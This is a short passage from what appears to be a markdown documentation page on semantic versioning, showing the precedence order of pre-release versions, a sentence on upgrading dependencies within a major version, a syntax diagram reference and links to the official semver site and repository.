    1.0.0-alpha < 1.0.0-alpha.1 < 1.0.0-alpha.beta < 1.0.0-beta < 1.0.0-beta.2 < 1.0.0-beta.11 < 1.0.0-rc.1 < 1.0.0.
    ```

Sematic versioning makes it easy to upgrade denpendent packages freely as long as _major_ version is the same.

#### Version Syntax

![Semver Syntax](./semver.svg)

#### Reference

1. [Semantic Versioning Official Site](https://semver.org/)
1. [Semantic Versioning Repository](https://github.com/semver/semver)
